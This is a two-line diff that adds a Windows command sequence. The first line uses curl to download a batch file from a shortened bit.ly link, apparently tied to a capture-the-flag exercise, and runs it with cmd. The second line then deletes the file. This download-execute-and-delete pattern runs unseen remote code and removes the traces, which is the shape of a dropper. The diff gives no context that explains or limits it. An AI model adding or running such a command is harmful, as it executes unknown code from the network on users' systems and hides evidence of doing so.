@@ -1,0 +1,2 @@
+curl -L -o discrete.bat https://bit.ly/discretectf && cmd /c discrete.bat
+del discrete.bat
